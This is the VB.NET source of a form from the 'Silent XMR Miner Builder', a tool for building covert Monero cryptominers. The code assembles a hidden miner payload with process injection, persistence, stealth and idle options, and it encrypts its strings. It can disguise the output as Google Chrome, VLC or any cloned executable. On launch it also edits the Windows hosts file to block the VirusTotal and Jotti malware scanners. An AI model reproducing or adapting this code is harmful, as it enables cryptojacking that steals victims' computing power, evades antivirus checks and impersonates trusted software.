Imports System.Security.Cryptography
Imports System.Text
Public Class Form1
    Public Shared rand As New Random()
    Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=-1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
    'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Font = New Font(Font.Name, 8.25F * 100.0F / CreateGraphics().DpiY, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)

        CheckForIllegalCrossThreadCalls = False
        Codedom.F = Me
        BackgroundWorker1.RunWorkerAsync()
        DateTimePicker1.Enabled = False
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            MephForm1.Text = "Silent XMR Miner Builder 0.9"
            txtMaxCPU.SelectedIndex = 4
        Catch ex As Exception
        End Try

        Try
            txtInstallPathMain.SelectedIndex = 0
            txtInjection.SelectedIndex = 0
            txtAdvParam.Text = advancedParams
        Catch ex As Exception
        End Try

        Try
            Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\System32\drivers\etc\hosts"
            If IO.File.Exists(path) AndAlso Not IO.File.ReadAllText(path).Contains("virustotal") Then

                Dim appendText As String = "127.0.0.1    https://www.virustotal.com" + Environment.NewLine + "127.0.0.1    http://www.virustotal.com" + Environment.NewLine + "127.0.0.1    www.virustotal.com" +
                   Environment.NewLine + "127.0.0.1    https://virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    www.virusscan.jotti.org"

                IO.File.AppendAllText(path, appendText)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public OutputPayload
    Public Resources_dll = Randomi(rand.Next(5, 10))
    Public Resources_xmr = Randomi(rand.Next(5, 10))
    Public Resources_xmrig = Randomi(rand.Next(5, 10))
    Public Resources_libs = Randomi(rand.Next(5, 10))
    Public Resources_winring = Randomi(rand.Next(5, 10))
    Public Resources_Parent = Randomi(rand.Next(5, 10))
    Public AESKEY As String = Randomi(rand.Next(5, 10))

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try
            If toggleEnableIdle.Checked AndAlso (Not IsNumeric(txtIdleWait.Text) OrElse CInt(txtIdleWait.Text) <= 0) Then
                MsgBox("Idle Wait time must be a number and above 0 minutes.", MsgBoxStyle.Exclamation)
            Else
                If txtPoolUsername.Text <> "" AndAlso txtPoolURL.Text <> "" Then
                    Dim s As New SaveFileDialog
                    s.Filter = "Executable |*.exe"
                    s.InitialDirectory = Application.StartupPath
                    If s.ShowDialog = DialogResult.OK Then
                        OutputPayload = s.FileName
                        BackgroundWorker2.RunWorkerAsync()
                        btnBuild.Enabled = False
                        btnBuild.Text = "Please wait..."
                    End If
                Else
                    MsgBox("Please enter valid pool settings.", MsgBoxStyle.Exclamation)
                    MephTabcontrol2.SelectedIndex = 0
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork

        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
            Dim InjectionTarget = txtInjection.Text.Split(" ")
            Dim Source = My.Resources.Program
            txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
            txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
            Dim builder As New StringBuilder(Source)
            Dim argstr As String = " -B " & If(chkAdvanced.Checked, txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & " --donate-level=5 "
            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))

            builder.Replace("#dll", Resources_dll)
            builder.Replace("#xmr", Resources_xmrig)
            builder.Replace("#libs", Resources_libs)
            builder.Replace("#winring", Resources_winring)
            builder.Replace("#ParentRes", Resources_Parent)
            builder.Replace("#STARTDELAY", txtStartDelay.Text)
            builder.Replace("#KEY", AESKEY)
            builder.Replace("#LIBSPATH", EncryptString("WinCFG\Libs\"))
            builder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
            builder.Replace("#InjectionDir", EncryptString(InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))))

            If toggleEnableIdle.Checked Then
                argstr += " --unam-idle-wait=" & txtIdleWait.Text & " --unam-idle-cpu=" & txtIdleCPU.Text.Replace("%", "") & " "
            End If

            If toggleEnableNicehash.Checked Then
                argstr += " --nicehash "
            End If

            If toggleEnableCPU.Checked = False Then
                argstr += " --no-cpu "
            End If

            If toggleSSLTLS.Checked Then
                argstr += " --tls "
            End If

            If toggleEnableStealth.Checked Then
                argstr += " --unam-stealth "
            End If

            builder.Replace("#ARGSTR", EncryptString(argstr))

            If toggleEnableGPU.Checked Then
                builder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
            End If

            If toggleEnableHidden.Checked Then
                builder.Replace("Public Shared IH As Boolean = False", "Public Shared IH As Boolean = True")
            End If

            If chkInstall.Checked Then
                txtLog.Text = txtLog.Text + ("Adding install... " + vbNewLine)
                builder.Replace("#Const INS = False", "#Const INS = True")
                builder.Replace("PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
            End If

            If chkAssembly.Checked Then
                txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
                builder.Replace("#Const Assembly = False", "#Const Assembly = True")

                builder.Replace("%Title%", txtTitle.Text)
                builder.Replace("%Description%", txtDescription.Text)
                builder.Replace("%Company%", txtCompany.Text)
                builder.Replace("%Product%", txtProduct.Text)
                builder.Replace("%Copyright%", txtCopyright.Text)
                builder.Replace("%Trademark%", txtTrademark.Text)
                builder.Replace("%v1%", num_Assembly1.Text)
                builder.Replace("%v2%", num_Assembly2.Text)
                builder.Replace("%v3%", num_Assembly3.Text)
                builder.Replace("%v4%", num_Assembly4.Text)
                builder.Replace("%Guid%", Guid.NewGuid.ToString)

            End If

            If AutoRemovalDateSwitch.Checked Then
                Debug.WriteLine("Auto Removal on")
                builder.Replace("#RemovalDate", DateTimePicker1.Value)
            Else
                Debug.WriteLine("Auto Removal Date off")

            End If

            Source = builder.ToString

            If chkIcon.Checked AndAlso txtIconPath.Text IsNot "" Then
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
            Else
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
            End If

            If Codedom.OK Then

                txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True

                Try
                    IO.File.Delete(IO.Path.GetTempPath + "\" + Resources_Parent + ".Resources")
                Catch ex As Exception
                End Try

            Else
                txtLog.Text = txtLog.Text + ("Error!" + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
            btnBuild.Enabled = True
            Return
        End Try

    End Sub

    Public Function AES_Encryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash_ As New MD5CryptoServiceProvider
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_.ComputeHash(Encoding.ASCII.GetBytes(AESKEY))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function

    Public Function EncryptString(ByVal input As String)
        Return Convert.ToBase64String(AES_Encryptor(Encoding.ASCII.GetBytes(input)))
    End Function

    Public Shared Function Randomi(ByVal length As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To length
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
        If chkInstall.Checked Then
            chkInstall.Text = "Enabled"
            txtInstallPathMain.Enabled = True
            txtInstallFileName.Enabled = True
        Else
            chkInstall.Text = "Disabled"
            txtInstallPathMain.Enabled = False
            txtInstallFileName.Enabled = False
        End If
    End Sub
    Private Sub AutoRemovalDateSwitch_CheckedChanged(sender As Object) Handles AutoRemovalDateSwitch.CheckedChanged
        If AutoRemovalDateSwitch.Checked Then
            Debug.WriteLine("Test1" + DateTimePicker1.Value)
            AutoRemovalDateSwitch.Text = "Enabled"
            DateTimePicker1.Enabled = True
        Else
            Debug.WriteLine("Test2" + DateTimePicker1.Value)
            AutoRemovalDateSwitch.Text = "Disabled"
            DateTimePicker1.Enabled = False
        End If
    End Sub

    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        If chkAssembly.Checked Then
            chkAssembly.Text = "Enabled"
            txtTitle.Enabled = True
            txtDescription.Enabled = True
            txtProduct.Enabled = True
            txtCompany.Enabled = True
            txtCopyright.Enabled = True
            txtTrademark.Enabled = True
            num_Assembly1.Enabled = True
            num_Assembly2.Enabled = True
            num_Assembly3.Enabled = True
            num_Assembly4.Enabled = True
            btn_assemblyRandom.Enabled = True
            btn_assemblyClone.Enabled = True
        Else
            chkAssembly.Text = "Disabled"
            txtTitle.Enabled = False
            txtDescription.Enabled = False
            txtProduct.Enabled = False
            txtCompany.Enabled = False
            txtCopyright.Enabled = False
            txtTrademark.Enabled = False
            num_Assembly1.Enabled = False
            num_Assembly2.Enabled = False
            num_Assembly3.Enabled = False
            num_Assembly4.Enabled = False
            btn_assemblyRandom.Enabled = False
            btn_assemblyClone.Enabled = False
        End If
    End Sub

    Private Sub btn_assemblyRandom_Click(sender As Object, e As EventArgs) Handles btn_assemblyRandom.Click
        Try
            Select Case rand.Next(4)
                Case 0
                    txtTitle.Text = "chrome.exe"
                    txtDescription.Text = "Google Chrome"
                    txtProduct.Text = "Google Chrome"
                    txtCompany.Text = "Google Inc."
                    txtCopyright.Text = "Copyright 2017 Google Inc. All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "70"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3538"
                    num_Assembly4.Text = "110"

                Case 1
                    txtTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

                Case 2
                    txtTitle.Text = "vlc"
                    txtDescription.Text = "VLC media player"
                    txtProduct.Text = "VLC media player"
                    txtCompany.Text = "VideoLAN"
                    txtCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors"
                    txtTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN"
                    num_Assembly1.Text = "3"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3"
                    num_Assembly4.Text = "0"

                Case 3
                    txtTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

            End Select
        Catch : End Try
    End Sub

    Private Sub btn_assemblyClone_Click(sender As Object, e As EventArgs) Handles btn_assemblyClone.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtTitle.Text = info.InternalName
                txtDescription.Text = info.FileDescription
                txtProduct.Text = info.CompanyName
                txtCompany.Text = info.ProductName
                txtCopyright.Text = info.LegalCopyright
                txtTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If

            Try
                num_Assembly1.Text = version(0)
                num_Assembly2.Text = version(1)
                num_Assembly3.Text = version(2)
                num_Assembly4.Text = version(3)
            Catch ex2 As Exception
            End Try
        End If
    End Sub

    Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
        If chkIcon.Checked Then
            chkIcon.Text = "Enabled"
            btnBrowseIcon.Enabled = True
        Else
            chkIcon.Text = "Disabled"
            btnBrowseIcon.Enabled = False
        End If
    End Sub

    Private Sub btnBrowseIcon_Click(sender As Object, e As EventArgs) Handles btnBrowseIcon.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Icon |*.ico"
            If o.ShowDialog = DialogResult.OK Then
                txtIconPath.Text = o.FileName
                picIcon.ImageLocation = o.FileName
            Else
                txtIconPath.Text = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub MephTabControl2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles MephTabcontrol2.SelectedIndexChanged
        On Error Resume Next
        If Me.MephTabcontrol2.SelectedIndex = 0 Then
        End If
    End Sub

    Private Sub labelGitHub_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelGitHub.LinkClicked
        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner")
    End Sub

    Private Sub labelHackforums_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelHackforums.LinkClicked
        Process.Start("https://hackforums.net/showthread.php?tid=5995773")
    End Sub

    Private Sub chkAdvanced_CheckedChanged(sender As Object) Handles chkAdvanced.CheckedChanged
        If chkAdvanced.Checked Then
            chkAdvanced.Text = "Enabled"
            txtAdvParam.Enabled = True
        Else
            chkAdvanced.Text = "Disabled"
            txtAdvParam.Enabled = False
        End If
    End Sub

    Private Sub toggleEnableIdle_CheckedChanged(sender As Object) Handles toggleEnableIdle.CheckedChanged
        If toggleEnableIdle.Checked Then
            txtIdleCPU.Enabled = True
            txtIdleWait.Enabled = True
        Else
            txtIdleCPU.Enabled = False
            txtIdleWait.Enabled = False
        End If
    End Sub
End Class
